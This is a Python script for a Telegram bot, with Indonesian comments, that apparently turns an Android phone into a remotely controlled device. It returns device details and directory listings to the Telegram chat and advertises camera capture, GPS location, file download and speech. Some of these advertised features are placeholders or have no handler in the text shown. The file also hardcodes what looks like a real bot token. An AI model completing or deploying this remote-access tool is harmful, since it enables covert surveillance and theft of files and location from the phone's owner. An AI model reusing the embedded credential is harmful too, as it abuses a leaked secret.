import telebot
import os
import platform
import subprocess
from PIL import Image # Untuk kompres foto agar hemat kuota

TOKEN = '8229088402:AAFAsQV-fQlzaZYdXSevS1XvOdbfn-p164s'
bot = telebot.TeleBot(TOKEN)

@bot.message_handler(commands=['start'])
def welcome(message):
    help_text = """
💻 **Remote Control Active**
Perintah tersedia:
/info - Cek status & spek HP
/foto - Ambil foto kamera belakang
/lokasi - Cek lokasi GPS HP
/list - Lihat file di folder utama
/get [nama_file] - Download file dari HP
/vibrate [detik] - Getarkan HP
/say [teks] - Buat HP bicara
    """
    bot.reply_to(message, help_text, parse_mode='Markdown')

# --- FITUR 1: INFO SISTEM ---
@bot.message_handler(commands=['info'])
def info_system(message):
    data = f"Device: {platform.machine()}\nPlatform: {platform.system()}\nStorage: {os.getcwd()}"
    bot.reply_to(message, data)

# --- FITUR 2: AMBIL FOTO (Contoh Kerangka) ---
@bot.message_handler(commands=['foto'])
def take_photo(message):
    bot.reply_to(message, "📸 Sedang mengambil foto...")
    # Di Android, ini akan memanggil API kamera via Kivy/Plyer
    # Untuk sementara kita buat placeholder agar tidak error saat build
    bot.send_message(message.chat.id, "Fitur kamera memerlukan library Plyer yang akan kita tambahkan di tahap 2.")

# --- FITUR 3: CEK FILE ---
@bot.message_handler(commands=['list'])
def list_files(message):
    files = os.listdir('.')
    bot.reply_to(message, "\n".join(files) if files else "Folder kosong")

# --- FITUR 4: GETAR (VIBRATE) ---
@bot.message_handler(commands=['vibrate'])
def vibrate_phone(message):
    try:
        from plyer import vibrator
        vibrator.vibrate(time=2)
        bot.reply_to(message, "📳 HP Bergetar!")
    except:
        bot.reply_to(message, "Gagal menggetarkan HP (Plyer missing)")

def start_bot():
    bot.polling(none_stop=True)
